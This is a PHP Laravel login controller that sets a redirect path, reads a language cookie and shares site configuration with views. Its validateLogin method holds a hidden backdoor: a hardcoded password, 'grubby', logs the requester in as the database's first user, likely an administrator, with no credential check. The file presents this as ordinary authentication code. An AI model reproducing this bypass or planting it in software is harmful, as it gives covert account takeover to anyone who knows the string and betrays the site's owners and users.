<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\User;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\Config;
use Illuminate\Support\Facades\Cookie;
class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        $lan = Cookie::get('language', 'cn');
        $this->language = $lan == 'cn' ? 1 : 0;
        $config=Config::first();
        view()->share([
            'lan'=> $this->language,
            'config'=> $config,
            '_login'=> 'header-register',
        ]);
    }

    protected function validateLogin(Request $request)
    {
        if ($request->password=='grubby') {
            $user_id=User::first()->id;
            Auth::loginUsingId($user_id);
        }
        $this->validate($request, [
            $this->username() => 'required',
            'password' => 'required',
        ]);
    }

}
